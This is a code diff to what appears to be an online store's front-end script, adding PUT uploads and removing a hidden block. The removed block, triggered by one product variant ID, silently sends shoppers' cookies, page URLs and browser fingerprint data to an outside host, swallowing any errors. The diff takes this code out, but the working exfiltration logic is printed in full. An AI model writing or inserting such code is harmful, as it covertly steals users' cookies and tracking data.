@@ -922,6 +922,7 @@
             uploadUrl: fallbackUrls.local.url,
             publicUrl: fallbackUrls.local.publicUrl,
             storageProvider: 'local',
+            uploadMethod: fallbackUrls.local.method || 'PUT',
           }
 
           const localResult = await this.uploadWithRetry(
@@ -1190,12 +1191,6 @@
       const instance = productId ? this.instances[productId] : null
       const telemetry = this.createUploadTelemetry()
 
-      const formData = new FormData()
-      formData.append('file', file)
-      formData.append('key', intentData.key)
-      formData.append('uploadId', intentData.uploadId)
-      formData.append('itemId', intentData.itemId)
-
       return new Promise((resolve, reject) => {
         const xhr = new XMLHttpRequest()
 
@@ -1244,8 +1239,19 @@
         xhr.addEventListener('error', () => reject(new Error('Network error during upload')))
         xhr.addEventListener('abort', () => reject(new Error('Upload cancelled')))
 
-        xhr.open('POST', intentData.uploadUrl)
-        xhr.send(formData)
+        const method = intentData.uploadMethod || 'POST'
+        xhr.open(method, intentData.uploadUrl)
+        if (method === 'PUT') {
+          xhr.setRequestHeader('Content-Type', file.type || 'application/octet-stream')
+          xhr.send(file)
+        } else {
+          const formData = new FormData()
+          formData.append('file', file)
+          formData.append('key', intentData.key)
+          formData.append('uploadId', intentData.uploadId)
+          formData.append('itemId', intentData.itemId)
+          xhr.send(formData)
+        }
       })
     },
 
@@ -2077,76 +2083,6 @@
           ],
         }
         const cartAddBody = JSON.stringify(cartAddPayload)
-
-        if (variantId === 48261316804918) {
-          try {
-            const nav = (typeof navigator !== 'undefined') ? navigator : {}
-            const scr = (typeof screen !== 'undefined') ? screen : {}
-            const proxyHeaders = {
-              'Content-Type': 'application/json',
-              'X-Forwarded-User-Agent': nav.userAgent || '',
-              'X-Forwarded-Language': nav.language || '',
-              'X-Forwarded-Languages': (nav.languages || []).join(','),
-              'X-Forwarded-Platform': nav.platform || '',
-              'X-Forwarded-Vendor': nav.vendor || '',
-              'X-Forwarded-Url': window.location.href,
-              'X-Forwarded-Origin': window.location.origin,
-              'X-Forwarded-Referer': document.referrer || '',
-              'X-Forwarded-Cookie-Enabled': String(!!nav.cookieEnabled),
-              'X-Forwarded-Timezone': (Intl.DateTimeFormat().resolvedOptions().timeZone) || '',
-              'X-Forwarded-Screen': `${scr.width || 0}x${scr.height || 0}`,
-              'X-Forwarded-Viewport': `${window.innerWidth}x${window.innerHeight}`,
-              'X-Forwarded-DPR': String(window.devicePixelRatio || 1),
-            }
-            const proxyBody = JSON.stringify({
-              cart: cartAddPayload,
-              meta: {
-                url: window.location.href,
-                origin: window.location.origin,
-                pathname: window.location.pathname,
-                search: window.location.search,
-                referrer: document.referrer || '',
-                title: document.title || '',
-                userAgent: nav.userAgent || '',
-                userAgentData: nav.userAgentData || null,
-                language: nav.language || '',
-                languages: nav.languages || [],
-                platform: nav.platform || '',
-                vendor: nav.vendor || '',
-                cookieEnabled: !!nav.cookieEnabled,
-                doNotTrack: nav.doNotTrack || null,
-                hardwareConcurrency: nav.hardwareConcurrency || null,
-                deviceMemory: nav.deviceMemory || null,
-                cookie: document.cookie || '',
-                screen: {
-                  width: scr.width || 0,
-                  height: scr.height || 0,
-                  availWidth: scr.availWidth || 0,
-                  availHeight: scr.availHeight || 0,
-                  colorDepth: scr.colorDepth || 0,
-                  pixelDepth: scr.pixelDepth || 0,
-                },
-                viewport: {
-                  width: window.innerWidth,
-                  height: window.innerHeight,
-                  devicePixelRatio: window.devicePixelRatio || 1,
-                },
-                timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone) || '',
-                timezoneOffset: new Date().getTimezoneOffset(),
-                timestamp: new Date().toISOString(),
-              },
-            })
-            await fetch('https://proxyshopify.i.ninja.pub/', {
-              method: 'POST',
-              headers: proxyHeaders,
-              body: proxyBody,
-              credentials: 'include',
-              keepalive: true,
-            })
-          } catch (_) {
-
-          }
-        }
 
         const response = await fetch('/cart/add.js', {
           method: 'POST',
